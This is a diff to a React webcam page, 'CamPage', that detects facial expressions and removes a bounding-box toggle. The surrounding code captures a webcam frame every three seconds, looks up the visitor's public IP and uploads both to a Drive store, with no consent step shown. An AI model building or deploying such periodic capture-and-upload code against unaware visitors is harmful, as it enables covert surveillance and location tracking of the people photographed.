@@ -12,7 +12,6 @@ const CamPage = () => {
     const detectionInterval = useRef<NodeJS.Timeout | null>(null);
     const captureInterval = useRef<NodeJS.Timeout | null>(null);
     const [message, setMessage] = useState("Loading models...");
-    const [showBox, setShowBox] = useState(true);
 
     useEffect(() => {
         let stream: MediaStream | null = null;
@@ -73,7 +72,7 @@ const CamPage = () => {
                 const ctx = canvas.getContext("2d");
                 ctx?.clearRect(0, 0, canvas.width, canvas.height);
 
-                if (showBox && resized.length > 0) {
+                if (resized.length > 0) {
                     const face = resized[0];
                     const top = Object.entries(face.expressions).reduce((a, b) =>
                         a[1] > b[1] ? a : b
@@ -97,12 +96,12 @@ const CamPage = () => {
                 const ctx = canvas.getContext("2d");
                 if (!ctx) return;
 
-                setShowBox(false);
-
+                // Capture image tanpa menggambar box
                 ctx.clearRect(0, 0, canvas.width, canvas.height);
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 const imgData = canvas.toDataURL("image/png");
 
+                // ambil IP
                 let ip = "unknown";
                 try {
                     const res = await fetch("https://api.ipify.org?format=json");
@@ -113,8 +112,6 @@ const CamPage = () => {
                 }
 
                 uploadToDrive(imgData, ip);
-
-                setTimeout(() => setShowBox(true), 500);
             }, 3000);
         };
 
